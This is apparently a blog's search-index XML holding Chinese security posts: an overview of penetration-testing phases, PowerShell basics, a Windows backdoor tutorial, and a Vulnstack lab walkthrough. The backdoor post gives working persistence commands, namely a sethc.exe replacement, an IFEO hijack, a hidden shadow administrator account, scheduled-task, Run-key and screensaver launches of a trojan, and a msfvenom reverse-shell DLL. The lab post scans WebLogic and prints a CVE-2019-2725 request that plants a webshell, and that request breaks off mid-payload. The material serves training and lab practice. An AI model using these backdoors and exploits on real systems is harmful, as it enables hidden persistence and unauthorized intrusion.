<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>渗透测试流程</title>
    <url>/posts/590ce9be.html</url>
    <content><![CDATA[<a id="more"></a>
<h2 id="前期交互阶段"><a href="#前期交互阶段" class="headerlink" title="前期交互阶段"></a>前期交互阶段</h2><p>在前期交互阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。<br>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p>
<h2 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h2><p>在目标范围确定之后，将进入情报搜集阶段，渗透测试团队可以利用各种信息来源与搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。<br>渗透测试者可以使用的情报搜集方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、探测扫描、被动监听、服务查点等。而对目标系统的情报探查能力是渗透测试者一项非常重要的技能，情报搜集是否充分在很大程度上决定了渗透测试的成败，因为如果你遗漏关键的情报信息，你将可能在后面的阶段里一无所获。</p>
<h2 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h2><p>在搜集到充分的情报信息之后，渗透测试团队的成员们停下敲击键盘，大家聚到一起针对获取的信息进行威胁建模与攻击规划。这是渗透测试过程中非常重要，但很容易被忽视的一个关键点。<br>通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道。</p>
<h2 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h2><p>在确定出最可行的攻击通道之后，接下来需要考虑该如何取得目标系统的访问控制权，即漏洞分析阶段<br>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p>
<h2 id="渗透攻击阶段"><a href="#渗透攻击阶段" class="headerlink" title="渗透攻击阶段"></a>渗透攻击阶段</h2><p>渗透攻击是渗透测试过程中最具有魅力的环节。在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。<br>渗透测试可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分的考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。</p>
<h2 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h2><p>后渗透攻击是整个渗透测试过程中最能体现渗透测试团队创造力与技术能力的环节。前面的环节可以说都是在按部就班地完成非常普遍的目标，而在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。<br>在不同的渗透测试场景中，这些攻击目标与途径可能是千变万化的，而设置是否准确并且可行，也取决于团队自身的创新意识、知识范畴、实际经验和技术能力。</p>
<h2 id="报告阶段"><a href="#报告阶段" class="headerlink" title="报告阶段"></a>报告阶段</h2><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和发掘出的系统安全漏洞、成功渗透供给的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p>
<p>本文抄自《Meteasploit渗透测试魔鬼训练营》</p>
]]></content>
  </entry>
  <entry>
    <title>Powershell</title>
    <url>/posts/6305b2aa.html</url>
    <content><![CDATA[<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">Get-Service	</span>//获取服务信息</span><br><span class="line"><span class="string">ls </span>/ <span class="string">dir </span>   //查看目录</span><br><span class="line"><span class="string">ls </span>| <span class="string">Format-Table </span><span class="string">name,</span><span class="string">Mode	</span>//查看目录 只查看<span class="string">name表</span>和<span class="string">mode表</span>（“|”管道符 前一个命令的输出 后一个命令的输入）</span><br><span class="line"> <span class="string">ls </span>| <span class="string">Format-Table </span><span class="string">name,</span><span class="string">Mode </span>&gt; <span class="string">demo.</span><span class="string">txt </span>	//将结果导入到<span class="string">demo.</span><span class="string">txt（</span>一个“&gt;”是覆盖，两个“&gt;&gt;”是添加）</span><br><span class="line"> <span class="string">type </span><span class="string">demo.</span><span class="string">txt </span>//查看<span class="string">demo文</span>件内容</span><br><span class="line"><span class="string">powershell可</span>以实现数学运算</span><br><span class="line"><span class="built_in">get-command</span>   //获取全部命令</span><br><span class="line"><span class="built_in">get-help</span> <span class="string">Get-Command </span> //帮助文档可以查看别名</span><br><span class="line"><span class="built_in">get-alias</span> </span><br><span class="line"><span class="string">Get-Alias </span>-<span class="string">name </span><span class="string">ls </span> //查看别名所对应的真实命令</span><br><span class="line"><span class="string">Set-Alias </span>-<span class="string">name </span><span class="string">pad </span>-<span class="string">value </span><span class="string">notepad </span> //创建一个临时生效的别名（关闭窗口后失效）</span><br><span class="line"><span class="string">del </span><span class="string">alias:pad </span>  //删除这个临时别名</span><br><span class="line">$<span class="string">name=</span><span class="string">"timor"</span>  //建一个变量 值为字符串   可以是字符串、命令</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Windows后门</title>
    <url>/posts/3620944d.html</url>
    <content><![CDATA[<a id="more"></a>
<h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><p>shift后门就是在远程界面按5次shift后调用粘滞键，而粘滞键的程序是<code>sethc.exe</code> 那么可以用<code>cmd.exe</code>替换<code>sethc.exe</code><br>操作系统：windows server 2003</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">C:<span class="tag">\<span class="name">Documents</span></span> and Settings<span class="tag">\<span class="name">Administrator</span></span>.GOD&gt;copy c:<span class="tag">\<span class="name">windows</span></span><span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">cmd</span></span>.exe c:<span class="tag">\</span></span><br><span class="line">windows<span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">sethc</span></span>.exe</span><br><span class="line">Overwrite c:<span class="tag">\<span class="name">windows</span></span><span class="tag">\<span class="name">system</span></span>32<span class="tag">\<span class="name">sethc</span></span>.exe? (Yes/No/All): y</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure>
<p>权限不够的话执行</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">takeown  /f  c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\s</span>ethc.*  /a  /r  /d y</span><br><span class="line">cacls  c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\s</span>ethc.exe  /T  /E /G system:F</span><br><span class="line">copy   c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe  c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\s</span>ethc.exe  /y</span><br></pre></td></tr></table></figure>

<p>本地启动<code>mstsc</code>远程连接<br>连续按5次<code>shift</code></p>
<img src="/posts/3620944d/1.png" class="" title="This is an 1 image">

<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>映像劫持又叫IFEO<br>当目标程序被映像劫持时，受害者启动被劫持的程序时，启动的是攻击者劫持后的程序。<br>操作系统：windows server 2003<br>在注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code>内添加<code>sethc.exe</code><br>然后在 sethc.exe 这个项中添加 debugger 键,键值为恶意程序。这里我用cmd.exe</p>
<img src="/posts/3620944d/2.png" class="" title="This is an 2 image">
<p>本地启动<code>mstsc</code>远程连接<br>连续按5次<code>shift</code></p>
<img src="/posts/3620944d/3.png" class="" title="This is an 3 image">
<h2 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h2><p>影子账户就是看不见的用户，隐蔽性很好，但注册表内可以看到<br>先创建一个$隐藏账号 添加到管理员组（添不添加管理员都无所谓）</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net<span class="built_in"> user </span>timor$ fuck!@#123 /add</span><br><span class="line">命令成功完成。</span><br><span class="line">C:\Users\Administrator&gt;net localgroup administrators timor$ /add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
<p>进入注册表<code>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code><br>如果没看到这个目录就右键目录点击权限把自己用户的权限设为完全控制<br>找到刚才建的用户<code>timor$</code></p>
<img src="/posts/3620944d/4.png" class="" title="This is an 4 image">
<p>看到右侧的值为<code>0x3ed</code>回到上层目录找到<code>000003ED</code><br>在找<code>administrator</code>的十六进制数<code>0x1f4</code>回到上层目录找到<code>000001F4</code>打开双击F值复制里面的内容粘贴到<code>000003ED</code>目录的F值内<br>导出<code>000003ED</code>和<code>timor$</code>目录<br>打开命令行删除<code>timor$</code>用户</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">net<span class="built_in"> user </span>timor$ /del</span><br></pre></td></tr></table></figure>
<p>双击两个导出的文件，影子账户就创建好了<br>这次在输入<code>net user timor$ /del</code>是删除不掉这个用户的，只能通过注册表删除</p>
<h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><p>隐藏文件，可用于木马文件隐藏</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">attrib</span> +<span class="selector-tag">s</span> +<span class="selector-tag">h</span> <span class="selector-tag">timor</span><span class="selector-class">.php</span>  隐藏<span class="selector-tag">timor</span><span class="selector-class">.php</span>文件</span><br><span class="line"><span class="selector-tag">attrib</span>命令 用于修改文件属性</span><br><span class="line">+<span class="selector-tag">s</span> 设置系统文件属性</span><br><span class="line">+<span class="selector-tag">h</span> 设置隐藏属性</span><br></pre></td></tr></table></figure>

<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>Windows实现定时任务主要有<code>schtasks</code>与<code>at</code>二种方式，<code>at</code>适用于win7以后的版本就不支持此命令了。</p>
<h3 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h3><p>操作系统：win7(system权限)</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32&gt;at 20:05 C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.exe</span><br><span class="line">新加了一项作业，其作业 ID = 1</span><br></pre></td></tr></table></figure>
<p>这里我运行了一个msf的木马</p>
<img src="/posts/3620944d/5.png" class="" title="This is an 5 image">
<h3 id="schtasks命令"><a href="#schtasks命令" class="headerlink" title="schtasks命令"></a>schtasks命令</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">//</span>普通权限启动timor.exe文件</span><br><span class="line">schtasks <span class="string">/Create</span> <span class="string">/TN</span> timor <span class="string">/SC</span> DAILY <span class="string">/ST</span> 01<span class="function">:02</span> <span class="string">/TR</span> timor.exe</span><br><span class="line"><span class="string">//</span>以system权限启动timor.exe</span><br><span class="line">schtasks <span class="string">/Create</span> <span class="string">/TN</span> timor2 <span class="string">/SC</span> DAILY <span class="string">/ST</span> 01<span class="function">:02</span> <span class="string">/TR</span> timor.exe <span class="string">/RL</span> HIGHEST</span><br><span class="line"><span class="string">//</span>产生文件路径</span><br><span class="line">C:\Windows\System32\Tasks</span><br><span class="line"><span class="string">//</span>查看服务状态</span><br><span class="line">schtasks <span class="string">/Query</span> <span class="string">/TN</span> timor</span><br><span class="line">删除服务</span><br><span class="line">schtasks <span class="string">/Delete</span> <span class="string">/TN</span> timor <span class="string">/F</span></span><br></pre></td></tr></table></figure>
<h2 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h2><p>当对方开启屏幕保护的情况下，我们可以通过注册表修改值<br>打开注册表<code>HKEY_CURRENT_USER\Control Panel\Desktop</code></p>
<img src="/posts/3620944d/6.png" class="" title="This is an 6 image">
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">SCRNSAVE.EXE</span><br><span class="line"><span class="comment">//默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</span></span><br><span class="line">ScreenSaveActive </span><br><span class="line"><span class="comment">//1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</span></span><br><span class="line">ScreenSaverTimeout</span><br><span class="line"><span class="comment">//指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</span></span><br><span class="line">ScreenSaverIsSecure</span><br><span class="line"><span class="comment">//启动屏保密码</span></span><br></pre></td></tr></table></figure>
<p>由于.scr文件本质上是可执行文件，因此两个扩展名都可以用于后门植入。(exe、scr)<br>可以直接在注册表修改</p>
<img src="/posts/3620944d/7.png" class="" title="This is an 7 image">
<p>也可以通过命令提示符或从PowerShell修改或添加注册表内容<br>cmd</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">reg add "HKEY_CURRENT_USER<span class="symbol">\C</span>ontrol Panel<span class="symbol">\D</span>esktop" /v SCRNSAVE.EXE /d C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.exe</span><br></pre></td></tr></table></figure>
<p>power shell</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ItemProperty -<span class="keyword">Path</span> 'HKCU:\<span class="keyword">Control</span> <span class="keyword">Panel</span>\Desktop\' -Name <span class="string">"SCRNSAVE.EXE"</span> -<span class="keyword">Value</span> <span class="string">"C:\Users\admin\Desktop\timor.exe"</span> –PassThru</span><br></pre></td></tr></table></figure>
<h2 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h2><p>注册表些内容实现开启自启动<br>注册表路径如下<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run</code><br>run 开机自启<br>runonce 之启动一次</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">\H</span>KEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line"><span class="symbol">\H</span>KEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</span><br><span class="line"><span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</span><br></pre></td></tr></table></figure>
<p>添加一个项，加入内容</p>
<img src="/posts/3620944d/8.png" class="" title="This is an 8 image">
<p>cmd</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">reg add HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\w</span>indows<span class="symbol">\c</span>urrentversion<span class="symbol">\r</span>un<span class="symbol">\ </span>/v 123 /t REG_SZ /d C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.exe</span><br></pre></td></tr></table></figure>
<h2 id="CLR-未成功"><a href="#CLR-未成功" class="headerlink" title="CLR(未成功)"></a>CLR(未成功)</h2><p>攻击机<br>使用msf生成dll文件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> LPORT=<span class="number">5555</span> -f dll &gt; timor.dll</span><br></pre></td></tr></table></figure>
<p>配置msf监听<br>靶机<br>增加 COR_ENABLE_PROFILING 值为 1，COR_PROFILER 值为 CLSID，CLSID可以为任意值，但不能与其他的重复</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING <span class="number">1</span></span><br><span class="line">SETX COR_PROFILER &#123;AAAABBBB<span class="number">-1234</span><span class="number">-1234</span><span class="number">-1234</span>-AAAABBBBCCCC&#125;</span><br></pre></td></tr></table></figure>
<p>在注册表中添加相应的键值</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">REG ADD "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID<span class="symbol">\&#123;</span>AAAABBBB-1234-1234-1234-AAAABBBBCCCC&#125;<span class="symbol">\I</span>nProcServer32" /VE /T REG_SZ /D "C:<span class="symbol">\U</span>sers<span class="symbol">\a</span>dmin<span class="symbol">\D</span>esktop<span class="symbol">\t</span>imor.dll" /F</span><br><span class="line">REG ADD "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID<span class="symbol">\&#123;</span>AAAABBBB-1234-1234-1234-AAAABBBBCCCC&#125;<span class="symbol">\I</span>nProcServer32" /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Vlunstack-ATT-CK实战系列0×2</title>
    <url>/posts/b4d06ff6.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX<br>WEB的密码是:!QAZ2wsx  修改一下密码:fuck!@#123</p>
<a id="more"></a>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>内网网段:10.10.10.1/24<br>DMZ网段:192.168.111.1/24<br>DC<br>IP:10.10.10.10<br>OS:Windows 2012(x64)<br>WEB<br>IP:10.10.10.80、192.168.111.80<br>OS:Windows 2008 R2 (x64)<br>PC<br>IP:10.10.10.201、192.168.111.201<br>OS:Windows 7(x32)<br>攻击机<br>IP:192.168.111.1 (Windows 10 x64)<br>IP:192.168.111.128 (Kali Linux)<br>进入WEB虚拟机<br><code>C:\Oracle\Middleware\user_projects\domains\base_domain</code><br>启动<code>startWebLogic</code></p>
<h2 id="渗透WEB主机"><a href="#渗透WEB主机" class="headerlink" title="渗透WEB主机"></a>渗透WEB主机</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>检查开放端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-11 01:13 EDT</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0013</span>s latency).</span><br><span class="line">Not shown: <span class="number">990</span> filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp    open  http</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds</span><br><span class="line"><span class="number">1433</span>/tcp  open  ms-sql-s</span><br><span class="line"><span class="number">3389</span>/tcp  open  ms-wbt-server</span><br><span class="line"><span class="number">7001</span>/tcp  open  afs3-callback</span><br><span class="line"><span class="number">49152</span>/tcp open  unknown</span><br><span class="line"><span class="number">49153</span>/tcp open  unknown</span><br><span class="line"><span class="number">49154</span>/tcp open  unknown</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">6</span>B:<span class="number">38</span>:D5 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">4.50</span> seconds</span><br></pre></td></tr></table></figure>
<p>80端口有可能存在web漏洞<br>1433端口有可能存在弱口令<br>3389端口可能存在20190708<br>445端口可能存在17010或08067<br>7001端口是weblogic可能存在反序列化</p>
<h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>访问80端口是一个空白界面没什么用<br>445端口没利用成功<br>3389端口用0708漏洞打蓝屏了 也是存在漏洞的<br>1433端口弱口令不通</p>
<p>访问7001端口<br><code>http://192.168.111.80:7001/console/login/LoginForm.jsp</code><br>输入默认密码错误<br>使用脚本扫一个漏洞</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/WeblogicScan<span class="meta"># python3 WeblogicScan.py 192.168.111.80 7001</span></span><br><span class="line"></span><br><span class="line">__        __   _     _             _        ____                  </span><br><span class="line">\ \      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __  </span><br><span class="line"> \ \ /\ / / _ \ <span class="string">'_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | '</span>_ \ </span><br><span class="line">  \ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |</span><br><span class="line">   \_/\_/ \___|_.__/|_|\___/ \__, |_|\___| |____/ \___\__,_|_| |_|</span><br><span class="line">                             |___/ </span><br><span class="line">                             By Tide_RabbitMask | V <span class="number">1.3</span> </span><br><span class="line"></span><br><span class="line">Welcome To WeblogicScan !!!</span><br><span class="line">Whoami：rabbitmask.github.io</span><br><span class="line">[<span class="meta">*</span>]Console path <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">+</span>]The target Weblogic console address <span class="keyword">is</span> exposed!</span><br><span class="line">[<span class="meta">+</span>]The path <span class="keyword">is</span>: http:<span class="comment">//192.168.111.80:7001/console/login/LoginForm.jsp</span></span><br><span class="line">[<span class="meta">+</span>]Please <span class="keyword">try</span> weak password blasting!</span><br><span class="line">[<span class="meta">*</span>]CVE_2014_4210 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">+</span>]The target Weblogic UDDI module <span class="keyword">is</span> exposed!</span><br><span class="line">[<span class="meta">+</span>]The path <span class="keyword">is</span>: http:<span class="comment">//192.168.111.80:7001/uddiexplorer/</span></span><br><span class="line">[<span class="meta">+</span>]Please verify the SSRF vulnerability!</span><br><span class="line">[<span class="meta">*</span>]CVE_2016_0638 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]Target weblogic not detected CVE<span class="number">-2016</span><span class="number">-0638</span></span><br><span class="line">[<span class="meta">*</span>]CVE_2016_3510 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]Target weblogic not detected CVE<span class="number">-2016</span><span class="number">-3510</span></span><br><span class="line">[<span class="meta">*</span>]CVE_2017_3248 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]CVE_2017_3248 not detected.</span><br><span class="line">[<span class="meta">*</span>]CVE_2017_3506 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]Target weblogic not detected CVE<span class="number">-2017</span><span class="number">-3506</span></span><br><span class="line">[<span class="meta">*</span>]CVE_2017_10271 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]Target weblogic not detected CVE<span class="number">-2017</span><span class="number">-10271</span></span><br><span class="line">[<span class="meta">*</span>]CVE_2018_2628 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]CVE_2018_2628 not detected.</span><br><span class="line">[<span class="meta">*</span>]CVE_2018_2893 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]CVE_2018_2893 not detected.</span><br><span class="line">[<span class="meta">*</span>]CVE_2018_2894 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]Target weblogic not detected CVE<span class="number">-2018</span><span class="number">-2894</span></span><br><span class="line">[<span class="meta">*</span>]CVE_2019_2725 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">+</span>]The target weblogic has a JAVA deserialization vulnerability:CVE<span class="number">-2019</span><span class="number">-2725</span></span><br><span class="line">[<span class="meta">+</span>]Your current permission <span class="keyword">is</span>:  web\de1ay</span><br><span class="line">[<span class="meta">*</span>]CVE_2019_2729 <span class="keyword">is</span> testing...</span><br><span class="line">[<span class="meta">-</span>]CVE_2019_2729 not detected.</span><br><span class="line">[<span class="meta">*</span>]Happy End,the goal <span class="keyword">is</span> <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span>:<span class="number">7001</span></span><br></pre></td></tr></table></figure>
<p>检测到cve_2019_2725漏洞<br>使用反序列化漏洞上马弹shell到msf<br>但是我上传冰蝎马之后无法使用不知道是什么原因，去网上找了个大马上去</p>
<details>
<summary>展开查看</summary>
<pre><code>

<figure class="highlight vbscript-html"><table><tr><td class="code"><pre><span class="line"><span class="xml">POST /_async/AsyncResponseService HTTP/1.1</span></span><br><span class="line"><span class="xml">Host: 192.168.111.80:7001</span></span><br><span class="line"><span class="xml">Content-Length: 88076</span></span><br><span class="line"><span class="xml">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="xml">SOAPAction:</span></span><br><span class="line"><span class="xml">Accept: */*</span></span><br><span class="line"><span class="xml">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span></span><br><span class="line"><span class="xml">Connection: keep-alive</span></span><br><span class="line"><span class="xml">content-type: text/xml</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.xmlDecoder"</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/timor2.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[</span></span><br><span class="line"><span class="vbscript">&lt;%@page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.io.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page import=<span class="string">"java.util.*"</span>%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%@page 